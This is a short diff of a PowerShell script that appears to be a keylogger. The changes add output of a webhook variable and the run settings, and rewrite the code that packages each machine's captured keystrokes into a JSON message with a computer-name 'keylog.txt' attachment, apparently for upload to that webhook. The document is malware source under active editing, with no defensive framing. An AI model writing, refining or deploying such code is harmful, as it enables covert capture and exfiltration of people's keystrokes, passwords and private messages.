@@ -1,3 +1,8 @@
+
+Write-Output $hook
+Write-Output $RunTime
+Write-Output $TimesRun
+
 Do{
     $getT = Get-Date;
     $end = $getT.addminutes($RunTime);
@@ -51,12 +56,12 @@ Do{
 
                 $data = @{
                     "username" = $env:COMPUTERNAME;
-                    "content" = ($env:COMPUTERNAME + " keylog");
+                    "content" = "$env:COMPUTERNAME keylog";
                     "attachments" = @(
                         @{
                             "id" = 0;
-                            "description" = ($env:COMPUTERNAME + " keylog");
-                            "filename" = ($env:COMPUTERNAME + "-keylog.txt");
+                            "description" = "$env:COMPUTERNAME keylog";
+                            "filename" = "$env:COMPUTERNAME-keylog.txt";
                         }
                     )
                 } | ConvertTo-JSON;
